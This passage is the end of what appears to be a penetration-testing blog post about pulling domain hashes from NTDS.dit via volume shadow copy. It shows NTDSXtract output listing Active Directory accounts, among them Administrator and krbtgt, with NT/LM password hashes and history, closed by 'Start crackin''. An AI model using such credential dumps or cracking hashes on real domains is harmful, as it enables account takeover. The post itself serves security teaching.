+</span></span><span class="line"><span class="cl">	NORMAL_ACCOUNT
+</span></span><span class="line"><span class="cl">Ancestors:
+</span></span><span class="line"><span class="cl">	<span class="nv">$ROOT_OBJECT</span>$ net projectmentor Users Administrator 
+</span></span><span class="line"><span class="cl">Password hashes:
+</span></span><span class="line"><span class="cl">	Administrator:<span class="nv">$NT$88</span>e4d9fabaecf3ded18dd80905521b29:::
+</span></span><span class="line"><span class="cl">Password history:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Record ID:           <span class="m">3563</span>
+</span></span><span class="line"><span class="cl">User name:           Guest
+</span></span><span class="line"><span class="cl">User principal name: 
+</span></span><span class="line"><span class="cl">SAM Account name:    Guest
+</span></span><span class="line"><span class="cl">SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+</span></span><span class="line"><span class="cl">GUID: 659723d7-1246-4959-b0fc-af80ea5e3816
+</span></span><span class="line"><span class="cl">SID:  S-1-5-21-3825330677-773554443-1603823854-501
+</span></span><span class="line"><span class="cl">When created:         2012-08-22 03:12:59
+</span></span><span class="line"><span class="cl">When changed:         2013-03-14 06:54:22
+</span></span><span class="line"><span class="cl">Account expires:      Never
+</span></span><span class="line"><span class="cl">Password last set:    2013-03-14 06:54:22.029303
+</span></span><span class="line"><span class="cl">Last logon:           2013-03-14 06:54:27.012817
+</span></span><span class="line"><span class="cl">Last logon timestamp: 2013-03-14 06:32:41.834022
+</span></span><span class="line"><span class="cl">Bad password <span class="nb">time</span>     2013-06-07 03:07:46.499917
+</span></span><span class="line"><span class="cl">Logon count:          <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Bad password count:   <span class="m">10</span>
+</span></span><span class="line"><span class="cl">User Account Control:
+</span></span><span class="line"><span class="cl">	PWD Not Required
+</span></span><span class="line"><span class="cl">	NORMAL_ACCOUNT
+</span></span><span class="line"><span class="cl">	PWD Never Expires
+</span></span><span class="line"><span class="cl">Ancestors:
+</span></span><span class="line"><span class="cl">	<span class="nv">$ROOT_OBJECT</span>$ net projectmentor Users Guest 
+</span></span><span class="line"><span class="cl">Password hashes:
+</span></span><span class="line"><span class="cl">	Guest:<span class="nv">$NT$823893</span>adfad2ada6e1a414f3ebdf58f7:::
+</span></span><span class="line"><span class="cl">Password history:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Record ID:           <span class="m">3564</span>
+</span></span><span class="line"><span class="cl">User name:           user
+</span></span><span class="line"><span class="cl">User principal name: 
+</span></span><span class="line"><span class="cl">SAM Account name:    user
+</span></span><span class="line"><span class="cl">SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+</span></span><span class="line"><span class="cl">GUID: c5a5c87a-93b4-4d80-97a1-1c605b9b0c03
+</span></span><span class="line"><span class="cl">SID:  S-1-5-21-3825330677-773554443-1603823854-1000
+</span></span><span class="line"><span class="cl">When created:         2012-08-22 03:12:59
+</span></span><span class="line"><span class="cl">When changed:         2013-06-07 02:51:54
+</span></span><span class="line"><span class="cl">Account expires:      Never
+</span></span><span class="line"><span class="cl">Password last set:    2013-03-14 03:25:11.793912
+</span></span><span class="line"><span class="cl">Last logon:           2013-06-07 02:51:54.152191
+</span></span><span class="line"><span class="cl">Last logon timestamp: 2013-06-07 02:51:54.152191
+</span></span><span class="line"><span class="cl">Bad password <span class="nb">time</span>     2013-04-19 05:25:40.412670
+</span></span><span class="line"><span class="cl">Logon count:          <span class="m">67</span>
+</span></span><span class="line"><span class="cl">Bad password count:   <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Account Control:
+</span></span><span class="line"><span class="cl">	NORMAL_ACCOUNT
+</span></span><span class="line"><span class="cl">	PWD Never Expires
+</span></span><span class="line"><span class="cl">Ancestors:
+</span></span><span class="line"><span class="cl">	<span class="nv">$ROOT_OBJECT</span>$ net projectmentor Users user 
+</span></span><span class="line"><span class="cl">Password hashes:
+</span></span><span class="line"><span class="cl">	user:<span class="nv">$NT$88</span>e4d9fabaecf3dec18dd80905521b29:::
+</span></span><span class="line"><span class="cl">Password history:
+</span></span><span class="line"><span class="cl">	user_nthistory0:<span class="nv">$NT$88</span>e4d9fabafcf3dec18dd80905521b29:::
+</span></span><span class="line"><span class="cl">	user_nthistory1:<span class="nv">$NT$0</span>c61031f010b2fbb88fe449fbf262477:::
+</span></span><span class="line"><span class="cl">	user_nthistory2:<span class="nv">$NT$88</span>e4dffabaecf3dec18dd80905521b29:::
+</span></span><span class="line"><span class="cl">	user_lmhistory0:c869027e01c3c4fe7626a90c87cc7fed:::
+</span></span><span class="line"><span class="cl">	user_lmhistory1:8be023cd858da1edd21b94907afe182c:::
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Record ID:           <span class="m">3610</span>
+</span></span><span class="line"><span class="cl">User name:           krbtgt
+</span></span><span class="line"><span class="cl">User principal name: 
+</span></span><span class="line"><span class="cl">SAM Account name:    krbtgt
+</span></span><span class="line"><span class="cl">SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+</span></span><span class="line"><span class="cl">GUID: 74e6bd0b-e4d5-42df-98d5-24f9060061c9
+</span></span><span class="line"><span class="cl">SID:  S-1-5-21-3825330677-773554443-1603823854-502
+</span></span><span class="line"><span class="cl">When created:         2012-08-22 03:16:03
+</span></span><span class="line"><span class="cl">When changed:         2012-08-22 03:31:13
+</span></span><span class="line"><span class="cl">Account expires:      Never
+</span></span><span class="line"><span class="cl">Password last set:    2012-08-22 03:16:03.166457
+</span></span><span class="line"><span class="cl">Last logon:           Never
+</span></span><span class="line"><span class="cl">Last logon timestamp: Never
+</span></span><span class="line"><span class="cl">Bad password <span class="nb">time</span>     Never
+</span></span><span class="line"><span class="cl">Logon count:          <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Bad password count:   <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Account Control:
+</span></span><span class="line"><span class="cl">	Disabled
+</span></span><span class="line"><span class="cl">	NORMAL_ACCOUNT
+</span></span><span class="line"><span class="cl">Ancestors:
+</span></span><span class="line"><span class="cl">	<span class="nv">$ROOT_OBJECT</span>$ net projectmentor Users krbtgt 
+</span></span><span class="line"><span class="cl">Password hashes:
+</span></span><span class="line"><span class="cl">	krbtgt:<span class="nv">$NT$7253</span>e8647254716b507a2dcb149ff2da:::
+</span></span><span class="line"><span class="cl">Password history:
+</span></span><span class="line"><span class="cl">	krbtgt_nthistory0:<span class="nv">$NT$7253</span>e86a7254716a507a2dcb149ff2da:::
+</span></span><span class="line"><span class="cl">	krbtgt_lmhistory0:113926e06a31d182623633041b632929:::
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Record ID:           <span class="m">3762</span>
+</span></span><span class="line"><span class="cl">User name:           John Doe
+</span></span><span class="line"><span class="cl">User principal name: jdoe@projectmentor.net
+</span></span><span class="line"><span class="cl">SAM Account name:    jdoe
+</span></span><span class="line"><span class="cl">SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+</span></span><span class="line"><span class="cl">GUID: bbf24c63-39a9-4cc4-8aa8-933f9ddee940
+</span></span><span class="line"><span class="cl">SID:  S-1-5-21-3825330677-773554443-1603823854-1104
+</span></span><span class="line"><span class="cl">When created:         2012-08-22 04:10:52
+</span></span><span class="line"><span class="cl">When changed:         2013-06-05 13:04:11
+</span></span><span class="line"><span class="cl">Account expires:      Never
+</span></span><span class="line"><span class="cl">Password last set:    2013-04-19 07:11:49.849592
+</span></span><span class="line"><span class="cl">Last logon:           2013-06-07 02:56:25.677855
+</span></span><span class="line"><span class="cl">Last logon timestamp: 2013-06-05 13:04:11.674344
+</span></span><span class="line"><span class="cl">Bad password <span class="nb">time</span>     2013-05-02 03:01:12.536251
+</span></span><span class="line"><span class="cl">Logon count:          <span class="m">242</span>
+</span></span><span class="line"><span class="cl">Bad password count:   <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Account Control:
+</span></span><span class="line"><span class="cl">	NORMAL_ACCOUNT
+</span></span><span class="line"><span class="cl">	PWD Never Expires
+</span></span><span class="line"><span class="cl">Ancestors:
+</span></span><span class="line"><span class="cl">	<span class="nv">$ROOT_OBJECT</span>$ net projectmentor Users John Doe 
+</span></span><span class="line"><span class="cl">Password hashes:
+</span></span><span class="line"><span class="cl">	John Doe:<span class="nv">$NT$88</span>e4d9fabaecf3ded18dd80905511b29:::
+</span></span><span class="line"><span class="cl">Password history:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Record ID:           <span class="m">3797</span>
+</span></span><span class="line"><span class="cl">User name:           Random User
+</span></span><span class="line"><span class="cl">User principal name: randy@projectmentor.net
+</span></span><span class="line"><span class="cl">SAM Account name:    randy
+</span></span><span class="line"><span class="cl">SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+</span></span><span class="line"><span class="cl">GUID: 2701eb29-628a-4568-a093-d33a7db10d04
+</span></span><span class="line"><span class="cl">SID:  S-1-5-21-3825330677-773554443-1603823854-1108
+</span></span><span class="line"><span class="cl">When created:         2013-04-08 02:34:04
+</span></span><span class="line"><span class="cl">When changed:         2013-05-27 16:06:07
+</span></span><span class="line"><span class="cl">Account expires:      Never
+</span></span><span class="line"><span class="cl">Password last set:    2013-04-19 06:59:25.423280
+</span></span><span class="line"><span class="cl">Last logon:           2013-04-08 02:34:10.482690
+</span></span><span class="line"><span class="cl">Last logon timestamp: 2013-04-08 02:34:10.482690
+</span></span><span class="line"><span class="cl">Bad password <span class="nb">time</span>     Never
+</span></span><span class="line"><span class="cl">Logon count:          <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Bad password count:   <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Account Control:
+</span></span><span class="line"><span class="cl">	NORMAL_ACCOUNT
+</span></span><span class="line"><span class="cl">	PWD Never Expires
+</span></span><span class="line"><span class="cl">Ancestors:
+</span></span><span class="line"><span class="cl">	<span class="nv">$ROOT_OBJECT</span>$ net projectmentor Users Random User 
+</span></span><span class="line"><span class="cl">Password hashes:
+</span></span><span class="line"><span class="cl">	Random User:<span class="nv">$NT$88</span>ead9fa5aecf3dec18dd80905521b29:::
+</span></span><span class="line"><span class="cl">Password history:
+</span></span><span class="line"><span class="cl">root@wpad:~/blog/NTDSXtract 1.0# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>All done. Start crackin'</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2013-06-11</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/" data-title="Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2" data-via="mubix"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/" data-title="Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/" data-title="Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/" data-title="Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/" data-title="Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/" class="prev" rel="prev" title="Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Volume Shadow Copy NTDS.dit Domain Hashes Remotely - Part 1</a>
+            <a href="/posts/2013/2013-08-10-problems-with-blogging-software/" class="next" rel="next" title="Problems with blogging software">Problems with blogging software<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
